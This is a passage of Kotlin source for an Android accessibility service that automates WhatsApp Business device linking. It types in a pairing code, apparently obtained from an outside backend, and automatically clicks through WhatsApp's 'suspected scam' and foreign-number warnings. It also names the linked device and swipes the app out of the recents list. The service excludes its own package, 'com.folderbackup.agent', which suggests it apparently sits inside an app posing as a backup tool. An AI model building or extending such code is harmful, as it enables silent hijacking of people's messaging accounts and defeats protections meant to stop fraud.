        recycleNodes(nodes)
        return false
    }

    private fun findNodesByTextRecursive(
        root: AccessibilityNodeInfo,
        text: String,
        partial: Boolean,
        list: MutableList<AccessibilityNodeInfo>
    ) {
        val nodeText = root.text?.toString()
        val contentDesc = root.contentDescription?.toString()
        
        val textMatches = if (partial) {
            nodeText?.contains(text, ignoreCase = true) == true
        } else {
            nodeText?.equals(text, ignoreCase = true) == true
        }
        
        val descMatches = if (partial) {
            contentDesc?.contains(text, ignoreCase = true) == true
        } else {
            contentDesc?.equals(text, ignoreCase = true) == true
        }

        if (textMatches || descMatches) {
            list.add(AccessibilityNodeInfo.obtain(root))
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            findNodesByTextRecursive(child, text, partial, list)
        }
    }

    private fun recycleNodes(nodes: List<AccessibilityNodeInfo>) {
        for (node in nodes) {
            try {
                node.recycle()
            } catch (e: Exception) {
                // Ignore
            }
        }
    }

    private fun getRoot(event: android.view.accessibility.AccessibilityEvent?): AccessibilityNodeInfo? {
        val eventPkg = event?.packageName?.toString()
        
        try {
            val winList = windows
            if (winList != null) {
                // First pass: look for an active or focused window that matches event package or target packages
                for (win in winList) {
                    val rootWin = win.root ?: continue
                    val pkgName = rootWin.packageName?.toString()
                    val isTargetPkg = pkgName == eventPkg || 
                                      pkgName == "com.android.vending" || 
                                      pkgName == "com.whatsapp.w4b" || 
                                      pkgName == "com.android.settings"
                    if (isTargetPkg && (win.isActive || win.isFocused)) {
                        Log.v(TAG, "getRoot: resolved active/focused target window: pkg=$pkgName class=${rootWin.className} childCount=${rootWin.childCount}")
                        return rootWin
                    }
                }
                
                // Second pass: any window that matches target packages
                for (win in winList) {
                    val rootWin = win.root ?: continue
                    val pkgName = rootWin.packageName?.toString()
                    val isTargetPkg = pkgName == eventPkg || 
                                      pkgName == "com.android.vending" || 
                                      pkgName == "com.whatsapp.w4b" || 
                                      pkgName == "com.android.settings"
                    if (isTargetPkg) {
                        Log.v(TAG, "getRoot: resolved non-active target window: pkg=$pkgName class=${rootWin.className} childCount=${rootWin.childCount}")
                        return rootWin
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }

        val rootActive = rootInActiveWindow
        if (rootActive != null) return rootActive
        
        if (event != null) {
            val source = event.source
            if (source != null) {
                val rootSrc = getRootNode(source)
                Log.d(TAG, "getRoot: resolved via event source: class=${rootSrc.className}")
                return rootSrc
            }
        }
        return null
    }

    private fun getRootNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo {
        var current = node
        while (current.parent != null) {
            current = current.parent
        }
        return current
    }

    private fun clickNodeByGesture(node: AccessibilityNodeInfo): Boolean {
        try {
            val rect = Rect()
            node.getBoundsInScreen(rect)
            val x = rect.centerX().toFloat()
            val y = rect.centerY().toFloat()
            Log.d(TAG, "clickNodeByGesture: bounds=$rect center=($x, $y)")
            if (x <= 0 || y <= 0) return false

            val path = Path().apply {
                moveTo(x, y)
            }
            val gestureBuilder = GestureDescription.Builder()
            val strokeDescription = GestureDescription.StrokeDescription(path, 0, 80)
            gestureBuilder.addStroke(strokeDescription)
            val success = dispatchGesture(gestureBuilder.build(), null, null)
            Log.d(TAG, "dispatchGesture result: $success")
            return success
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao executar gesto de clique: ${e.message}")
        }
        return false
    }

    private fun typeIntoField(field: AccessibilityNodeInfo, text: String): Boolean {
        if (setText(field, text)) return true
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            ?: return false
        clipboard.setPrimaryClip(ClipData.newPlainText("pairing_char", text))
        field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
        if (field.performAction(AccessibilityNodeInfo.ACTION_PASTE)) return true
        return setText(field, text)
    }

    private fun setText(node: AccessibilityNodeInfo, text: String): Boolean {
        val args = Bundle()
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
    }

    private fun performClickOnParent(node: AccessibilityNodeInfo): Boolean {
        var current: AccessibilityNodeInfo? = node
        repeat(6) { i ->
            current = current?.parent ?: return@repeat
            val isClickable = current?.isClickable == true
            val className = current?.className?.toString()
            Log.v(TAG, "Parent level $i: class=$className clickable=$isClickable")
            if (isClickable && current?.performAction(AccessibilityNodeInfo.ACTION_CLICK) == true) {
                Log.d(TAG, "Clicked parent class=$className at level $i")
                return true
            }
        }
        return false
    }

    private fun findFirstEditText(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (root.className?.toString()?.contains("EditText") == true) return root
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findFirstEditText(child)
            if (found != null) return found
        }
        return null
    }

    private fun collectEditTexts(root: AccessibilityNodeInfo, out: MutableList<AccessibilityNodeInfo>) {
        if (root.className?.toString()?.contains("EditText") == true) {
            out.add(root)
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            collectEditTexts(child, out)
        }
    }

    private fun clickWhatsappIcon(root: AccessibilityNodeInfo): Boolean {
        val labels = listOf(
            "WA Business",
            "WhatsApp Business",
            "WABusiness",
        )
        for (label in labels) {
            val nodes = root.findAccessibilityNodeInfosByText(label)
            for (node in nodes) {
                if (isOurBackupApp(node)) continue
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
                if (performClickOnParent(node)) return true
            }
            if (clickByContentDescription(root, label, partial = true)) return true
        }
        return clickLauncherIconByDescription(root)
    }

    private fun isOurBackupApp(node: AccessibilityNodeInfo): Boolean {
        val pkg = node.packageName?.toString().orEmpty()
        if (pkg == "com.folderbackup.agent") return true
        val label = "${node.text} ${node.contentDescription}"
        return label.contains("backup", ignoreCase = true)
    }

    private fun clickLauncherIconByDescription(root: AccessibilityNodeInfo): Boolean {
        return findLauncherIconNode(root)?.let { node ->
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                true
            } else {
                performClickOnParent(node)
            }
        } == true
    }

    private fun findLauncherIconNode(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val desc = root.contentDescription?.toString().orEmpty()
        val text = root.text?.toString().orEmpty()
        val haystack = "$desc $text"
        if (haystack.contains("backup", ignoreCase = true)) return null
        if (haystack.contains("business", ignoreCase = true) ||
            haystack.equals("WABusiness", ignoreCase = true) ||
            haystack.equals("WA Business", ignoreCase = true)
        ) {
            if (!isOurBackupApp(root)) return root
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findLauncherIconNode(child)
            if (found != null) return found
        }
        return null
    }

    private fun isLauncherPackage(pkg: String): Boolean {
        return pkg.contains("launcher", ignoreCase = true) ||
            pkg == "com.miui.home" ||
            pkg == "com.mi.android.globallauncher" ||
            pkg == "com.sec.android.app.launcher" ||
            pkg == "com.google.android.apps.nexuslauncher"
    }

    private fun isAppInstalled(packageName: String): Boolean {
        return try {
            packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun findWhatsappRecentCardRect(root: AccessibilityNodeInfo): Rect? {
        val hints = listOf("WHATSAPP", "W4B", "BUSINESS")
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        val rect = Rect()
        var best: Rect? = null
        var bestArea = 0
        var visited = 0
        while (queue.isNotEmpty() && visited < 600) {
            val node = queue.removeFirst()
            visited++
            val label = buildString {
                node.text?.let { append(it).append(' ') }
                node.contentDescription?.let { append(it) }
            }.uppercase()
            if (hints.any { label.contains(it) }) {
                node.getBoundsInScreen(rect)
                val area = rect.width() * rect.height()
                if (area > bestArea && rect.height() > 60 && rect.width() > 60) {
                    bestArea = area
                    best = Rect(rect)
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return best
    }

    private fun isInTopRightQuarter(nodeRect: Rect, cardRect: Rect): Boolean {
        val midX = cardRect.left + cardRect.width() * 0.55f
        val midY = cardRect.top + cardRect.height() * 0.35f
        return nodeRect.centerX() >= midX && nodeRect.centerY() <= midY + cardRect.height() * 0.25f
    }

    /** Botão X / Fechar no canto do card (lista de apps recentes). */
    private fun clickCloseButtonOnRecentCard(root: AccessibilityNodeInfo, cardRect: Rect): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        val rect = Rect()
        val closeHints = listOf(
            "FECHAR", "CLOSE", "REMOVER", "REMOVE", "DESCARTAR", "DISMISS",
            "ELIMINAR", "CLEAR", "×", "X",
        )
        var bestNode: AccessibilityNodeInfo? = null
        var bestSize = Int.MAX_VALUE
        var visited = 0
        while (queue.isNotEmpty() && visited < 600) {
            val node = queue.removeFirst()
            visited++
            if (node.isClickable) {
                node.getBoundsInScreen(rect)
                if (Rect.intersects(rect, cardRect)) {
                    val label = buildString {
                        node.text?.let { append(it).append(' ') }
                        node.contentDescription?.let { append(it) }
                    }.uppercase()
                    val looksLikeClose = closeHints.any { label.contains(it) } ||
                        (rect.width() in 1..140 && rect.height() in 1..140 && isInTopRightQuarter(rect, cardRect))
                    if (looksLikeClose) {
                        val size = rect.width() * rect.height()
                        if (size < bestSize) {
                            bestSize = size
                            bestNode = node
                        }
                    }
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return bestNode?.let { clickNode(it) } == true
    }

    private fun closeWhatsappRecentCard(root: AccessibilityNodeInfo): Boolean {
        val cardRect = findWhatsappRecentCardRect(root) ?: return false
        if (clickCloseButtonOnRecentCard(root, cardRect)) {
            Log.i(TAG, "Recents: botão X/fechar no card WA $cardRect")
            Thread.sleep(500)
            return true
        }
        if (swipeLeftFromRect(cardRect)) {
            Log.i(TAG, "Recents: arrastou card WA para o lado $cardRect")
            Thread.sleep(500)
            return true
        }
        if (swipeUpFromRect(cardRect)) {
            Log.i(TAG, "Recents: arrastou card WA para cima $cardRect")
            return true
        }
        return false
    }

    private fun isWhatsappVisibleInRecents(root: AccessibilityNodeInfo): Boolean {
        return findWhatsappRecentCardRect(root) != null
    }

    private fun swipeWhatsappRecentCard(root: AccessibilityNodeInfo): Boolean {
        return closeWhatsappRecentCard(root)
    }

    private fun swipeLeftFromRect(rect: Rect): Boolean {
        return try {
            val y = rect.centerY().toFloat()
            val xStart = (rect.right - rect.width() * 0.15f).coerceAtMost(resources.displayMetrics.widthPixels * 0.92f)
            val xEnd = rect.left - rect.width() * 0.3f
            val path = Path().apply {
                moveTo(xStart, y)
                lineTo(xEnd.coerceAtLeast(0f), y)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 280))
                .build()
            dispatchGesture(gesture, null, null)
            Thread.sleep(450)
            true
        } catch (e: Exception) {
            Log.w(TAG, "swipeLeftFromRect: ${e.message}")
            false
        }
    }

    private fun swipeDismissRecentsCard(): Boolean {
        val metrics = resources.displayMetrics
        val rect = Rect(
            (metrics.widthPixels * 0.08f).toInt(),
            (metrics.heightPixels * 0.35f).toInt(),
            (metrics.widthPixels * 0.92f).toInt(),
            (metrics.heightPixels * 0.72f).toInt(),
        )
        Log.i(TAG, "Recents: swipe genérico no card central")
        return swipeUpFromRect(rect)
    }

    private fun swipeUpFromRect(rect: Rect): Boolean {
        return try {
            val cx = rect.centerX().toFloat()
            val yStart = (rect.top + rect.height() * 0.75f)
                .coerceAtMost(resources.displayMetrics.heightPixels * 0.85f)
            val yEnd = (rect.top - rect.height() * 0.5f).coerceAtLeast(0f)
            val path = Path().apply {
                moveTo(cx, yStart)
                lineTo(cx, yEnd)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 320))
                .build()
            dispatchGesture(gesture, null, null)
            Thread.sleep(450)
            true
        } catch (e: Exception) {
            Log.w(TAG, "swipeUpFromRect: ${e.message}")
            false
        }
    }

    companion object {
        private const val TAG = "WaRegA11y"

        private val SCAM_WARNING_HINTS = listOf(
            "SUSPEITA", "GOLPE", "SCAM", "ESTAFA", "FRAUDE", "ENGAÑO", "ENGANO", "FRAUD",
            "SOSPECH", "ALERTA", "CUIDADO", "PRECAU",
        )
        private val SCAM_COUNTRY_HINTS = listOf(
            "OUTRO PAÍS", "OUTRO PAIS", "ANOTHER COUNTRY", "OTRO PAÍS", "OTRO PAIS",
            "BRASIL", "COLOMBIA", "INTERNACIONAL", "INTERNATIONAL",
            "NÚMERO DE OUTRO", "NUMERO DE OUTRO", "NÚMERO DE OTRO", "NUMERO DE OTRO",
        )
        private val SCAM_CONNECT_HINTS = listOf(
            "CONECTAR DISPOSITIVO", "CONNECT DEVICE", "VINCULAR DISPOSITIVO",
            "CONECTAR EL DISPOSITIVO", "VINCULAR EL DISPOSITIVO",
        )
        private val NAME_DEVICE_HINTS = listOf(
            "NOME DO DISPOSITIVO", "NOME DE DISPOSITIVO", "DEVICE NAME",
            "NOMBRE DEL DISPOSITIVO", "NOMBRE DE DISPOSITIVO",
        )

        @Volatile
        var instance: WhatsappRegistrationAccessibilityService? = null

        fun pressHome(): Boolean {
            val service = instance ?: return false
            return service.performGlobalAction(GLOBAL_ACTION_HOME)
        }

        fun pressBack(): Boolean {
            val service = instance ?: return false
            return service.performGlobalAction(GLOBAL_ACTION_BACK)
        }

        /**
         * Fecha WhatsApp na lista de apps recentes (botão X ou arrastar card).
         * Igual ao gesto manual: botão quadrado → fechar WA → HOME.
         */
        fun dismissWhatsappFromRecents(): Boolean {
            val service = instance ?: return false
            pressHome()
            Thread.sleep(500)
            repeat(4) { attempt ->
                if (!service.performGlobalAction(GLOBAL_ACTION_RECENTS)) {
                    Log.w(TAG, "dismissRecents: RECENTS falhou tentativa ${attempt + 1}")
                    Thread.sleep(400)
                    return@repeat
                }
                Thread.sleep(1100)
                val root = service.rootInActiveWindow
                if (root != null) {
                    if (service.closeWhatsappRecentCard(root)) {
                        Thread.sleep(700)
                        pressHome()
                        return true
                    }
                    if (service.swipeDismissRecentsCard()) {
                        Thread.sleep(700)
                        pressHome()
                        return true
                    }
                }
                pressHome()
                Thread.sleep(400)
            }
            pressHome()
            return true
        }

        /** Fora das telas de pairing/menu — seguro pedir código Evolution. */
        fun isSafeForPairingCodeFetch(): Boolean {
            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) return false
            if (isOnLinkedDevicesMenu()) return false
            return instance?.whatsappRoot() != null
        }

        /** Lista de conversas (abas CHATS/STATUS visíveis) — preferencial, não obrigatório. */
        fun isOnWhatsappChatHome(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) return false
            if (isOnLinkedDevicesMenu()) return false
            val homeTabs = listOf(
                "CHATS", "CONVERSAS", "CONVERSACIONES",
                "STATUS", "ESTADO", "ESTADOS",
                "COMUNIDADES", "COMMUNITIES",
            )
            return service.treeContainsAny(root, homeTabs)
        }

        /** Menu Dispositivos conectados (sem ser a tela do código). */
        fun isOnLinkedDevicesMenu(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (isOnEnterCodeScreen()) return false
            val hints = listOf(
                "DISPOSITIVOS CONECTADOS",
                "DISPOSITIVOS VINCULADOS",
                "LINKED DEVICES",
                "VINCULAR DISPOSITIVO",
                "LINK A DEVICE",
                "VINCULAR UN DISPOSITIVO",
            )
            return service.treeContainsAny(root, hints)
        }

        /** Sai de telas de pairing/menu; aceita qualquer tela WA que não seja pairing. */
        fun ensureWhatsappChatHome(maxSteps: Int = 8): Boolean {
            repeat(maxSteps) {
                if (isSafeForPairingCodeFetch() && isOnWhatsappChatHome()) return true
                if (isOnEnterCodeScreen() || isOnLinkedDevicesMenu() || isOnScamWarningScreen() || isOnNameDeviceScreen()) {
                    pressBack()
                    Thread.sleep(500)
                    return@repeat
                }
                if (isSafeForPairingCodeFetch()) return true
                pressBack()
                Thread.sleep(400)
            }
            return isSafeForPairingCodeFetch()
        }

        /** Chamado pelo coordinator em loop — não espera eventos passivos. */
        fun runLinkDeviceStep(): Boolean = instance?.tickLinkDevice() ?: false

        fun isPairingCodeFilled(code: String): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            val normalized = code.replace(Regex("[^A-Za-z0-9]"), "").uppercase().take(8)
            if (normalized.length < 8) return false
            val edits = service.findPairingCodeEdits(root)
            return service.verifyPairingCodeEntered(edits, normalized)
        }

        /** Clica Conectar dispositivo na tela anti-golpe — chamada direta pelo coordinator. */
        fun confirmScamWarning(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (isOnNameDeviceScreen()) {
                WhatsappLinkDeviceState.beginNameDevice(
                    WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
                )
                return true
            }
            if (!isOnScamWarningScreen() && !WhatsappLinkDeviceState.needsA11y()) return false
            if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.ConfirmScamWarning &&
                WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice
            ) {
                WhatsappRegistrationState.markPairingDone()
                WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
            }
            if (service.dismissScamWarningScreen(root)) {
                WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
                return true
            }
            return isOnNameDeviceScreen()
        }

        /** Digitação direta do código — usado pelo coordinator (não depende só do step machine). */
        fun typePairingCode(code: String): Boolean {
            val service = instance
            if (service == null) {
                Log.w(TAG, "typePairingCode: serviço a11y não conectado")
                return false
            }
            val root = service.whatsappRoot()
            if (root == null) {
                Log.w(TAG, "typePairingCode: whatsappRoot null")
                return false
            }
            if (service.enterPairingCodeOnScreen(root, code)) {
                WhatsappLinkDeviceState.pairingCodeSubmitted = true
                Log.i(TAG, "typePairingCode OK: $code")
                return true
            }
            Log.w(TAG, "typePairingCode falhou: $code")
            return false
        }

        /** Erro após digitar código inválido/expirado. */
        fun isOnPairingErrorDialog(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            return service.treeContainsAny(
                root,
                listOf(
                    "NÃO FOI POSSÍVEL CONECTAR",
                    "NAO FOI POSSIVEL CONECTAR",
                    "COULD NOT CONNECT",
                    "COULD NOT LINK",
                    "NO FUE POSIBLE CONECTAR",
                    "NO SE PUDO CONECTAR",
                    "SOLICITE UM NOVO CÓDIGO",
                    "SOLICITE UM NOVO CODIGO",
                    "REQUEST A NEW CODE",
                    "SOLICITA UN NUEVO CÓDIGO",
                ),
            )
        }

        fun dismissPairingErrorDialog(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            val dismiss = listOf("OK", "ENTENDI", "GOT IT", "ACEPTAR", "ACCEPT")
            for (text in dismiss) {
                if (service.clickByText(root, text, partial = false)) return true
            }
            return false
        }

        /** Tela "Insira o código" com caixinhas visível — evita reabrir activity (invalida sessão). */
        fun isOnEnterCodeScreen(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            return service.findPairingCodeEdits(root).size >= 4
        }

        fun countEnterCodeFields(): Int {
            val service = instance ?: return 0
            val root = service.whatsappRoot() ?: return 0
            return service.findPairingCodeEdits(root).size
        }

        /** Tela "Suspeita de golpe" após digitar o código (ou alerta modal com OK). */
        fun isOnScamWarningScreen(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (service.findPairingCodeEdits(root).size >= 4) return false
            val hasWarning = service.treeContainsAny(root, SCAM_WARNING_HINTS) ||
                service.treeContainsAny(root, SCAM_COUNTRY_HINTS)
            val hasConnect = service.treeContainsAny(root, SCAM_CONNECT_HINTS)
            if (hasWarning && hasConnect) return true
            if (hasWarning && service.treeContainsAny(
                    root,
                    listOf("OK", "ENTENDI", "ENTENDIDO", "ACEPTAR", "GOT IT", "ACEITO"),
                )
            ) return true
            return hasConnect
        }

        /** Clica OK ou Conectar o mais rápido possível — número internacional (CO→BR). */
        fun confirmScamWarningFast(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (isOnNameDeviceScreen()) {
                WhatsappLinkDeviceState.beginNameDevice(
                    WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
                )
                return true
            }
            if (service.treeContainsAny(root, SCAM_WARNING_HINTS) ||
                service.treeContainsAny(root, SCAM_COUNTRY_HINTS)
            ) {
                if (service.clickScamDismissOk(root)) return true
            }
            return confirmScamWarning()
        }

        /** Tela para nomear o dispositivo vinculado. */
        fun isOnNameDeviceScreen(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (service.findDeviceNameEdit(root) != null) return true
            if (service.findPairingCodeEdits(root).size >= 4) return false
            if (service.treeContainsAny(root, NAME_DEVICE_HINTS)) return true
            val edit = service.findFirstEditText(root) ?: return false
            return edit.isEditable && !service.treeContainsAny(root, SCAM_WARNING_HINTS)
        }

        /** Voltou ao chat principal ou lista de dispositivos — pairing concluído. */
        fun isPairingFlowComplete(): Boolean {
            val service = instance ?: return false
            val root = service.whatsappRoot() ?: return false
            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) {
                return false
            }
            val doneHints = listOf(
                "DISPOSITIVOS CONECTADOS",
                "DISPOSITIVOS VINCULADOS",
                "LINKED DEVICES",
                "DISPOSITIVOS VINCULADOS",
                "CHATS",
                "CONVERSAS",
                "CONVERSACIONES",
                "STATUS",
                "ESTADO",
                "ESTADOS",
                "COMUNIDADES",
                "COMMUNITIES",
            )
            return service.treeContainsAny(root, doneHints)
        }

        fun wakeScreen(): Boolean {
            val service = instance ?: return false
            service.wakeScreen()
            return true
        }
    }
}
